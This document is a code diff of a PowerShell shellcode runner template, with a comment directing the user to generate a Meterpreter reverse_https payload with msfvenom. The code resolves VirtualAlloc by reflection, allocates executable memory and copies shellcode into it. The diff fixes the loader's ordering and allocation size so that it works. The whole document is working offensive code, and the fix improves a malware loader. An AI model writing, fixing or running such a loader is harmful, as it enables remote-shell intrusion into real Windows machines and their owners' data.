@@ -1,5 +1,5 @@
 # =============================================================================
-# TEMPLATE — replace $buf with your actual shellcode before running
+# TEMPLATE - replace $buf with your actual shellcode before running
 #
 # Generate shellcode:
 #   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f ps1
@@ -44,15 +44,10 @@ function LookupFunc {
     return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
 }
 
-$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
-$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
-$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
-$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+# FIXED: declare $buf BEFORE VirtualAlloc, and use $buf.Length instead of hardcoded 0x1000
+[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 # <- replace with your full shellcode
 
-$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
-
-
-[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 # ← replace with your full shellcode
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)
 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
 
